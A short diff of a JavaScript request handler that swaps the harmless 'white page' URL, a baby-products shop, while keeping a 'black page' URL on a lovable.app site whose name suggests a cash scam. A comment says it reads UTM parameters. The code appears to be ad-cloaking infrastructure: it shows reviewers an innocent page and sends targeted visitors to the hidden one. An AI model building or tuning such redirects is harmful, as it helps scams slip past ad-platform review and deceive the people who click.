@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://frenchwink.com/collections/baby-kids-toys/products/touth-fairy-mouse-box-moulin-roty";
+    const whitePageURL = "https://www.babyshower.es/en/organic-moonie-teddy-light-sound-polar-bear-6129.html";
     const blackPageURL = "https://lovefrecashhhh.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
